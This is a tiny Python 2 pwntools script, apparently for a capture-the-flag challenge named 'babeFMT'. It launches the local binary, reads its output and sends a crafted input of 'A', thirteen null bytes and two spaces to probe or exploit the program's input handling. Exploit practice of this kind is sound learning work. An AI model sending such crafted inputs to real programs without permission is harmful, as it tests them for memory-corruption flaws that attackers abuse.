from pwn import *

p = process('./babeFMT')

pause()
print p.recv()
p.send('A'+'\x00'*13+'  ')
print p.recvall()
